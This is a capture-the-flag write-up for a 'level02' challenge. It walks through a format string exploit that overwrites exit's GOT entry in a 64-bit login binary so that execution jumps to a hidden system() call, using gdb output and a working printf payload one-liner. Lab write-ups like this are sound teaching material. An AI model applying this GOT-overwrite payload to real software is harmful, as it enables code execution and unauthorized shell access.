## Got some printf left ? (level02)

Here, with this [binary](source.c), we have a pseudo login prompt again. After
checking the lengths of the buffers and the `fgets` calls, we do not have a
sufficient overflow to do anything useful. So the part we need to exploit is at
the end of the program. It's when it is printing back our username to us through
a very dumb `printf` on _username_.

> This is the first 64-bit binary to exploit. This changes a few things, but not
> much.

We will execute a
[got overwrite](https://infosecwriteups.com/got-overwrite-bb9ff5414628) exploit.

To do this we need the `exit`'s got address (not puts, because I want the string
saying that I dont have access to print before I effectively do get access, for
fun):

```shell
# run gdb on the binary
gdb ./level02
(gdb) disass exit
Dump of assembler code for function exit@plt:
   0x0000000000400710 <+0>:     jmpq   *0x200b12(%rip)        # 0x601228 <exit@got.plt>
   0x0000000000400716 <+6>:     pushq  $0xa
   0x000000000040071b <+11>:    jmpq   0x400660
End of assembler dump.
```

Then we must find a way to get a shell. The `system` function is actually called
in the binary but it is within an unreachable condition. All we have to do then
is to set `exit`'s got address to the place where `system` is called:

```shell
(gdb) disass main
   0x0000000000400a80 <+620>:   callq  0x4006c0 <printf@plt>
   0x0000000000400a85 <+625>:   mov    $0x400d32,%edi
   0x0000000000400a8a <+630>:   callq  0x4006b0 <system@plt>
```

We're gonna use the address of the instruction just above system since it loads
its argument into the appropriate register. 0x400a85 = 4196997 in base 10, which 
is the value we want to write at `exit`'s got address. So this is going to be
our field width to set the number of bytes written by printf. Then we can pass
the address we want to write to as an argument to n. This will be the last thing
on the stack at the moment `printf` is called which will be the start of the
_password_ buffer. So we pass `exit`'s got address as a password.

```shell
(echo '%04196997d%8$n'; python -c 'print "\x60\x12\x28"[::-1]'; cat) | ./level02
```

Also here we go look for the 8th argument for the n conversion because this
where the password buffer starts.
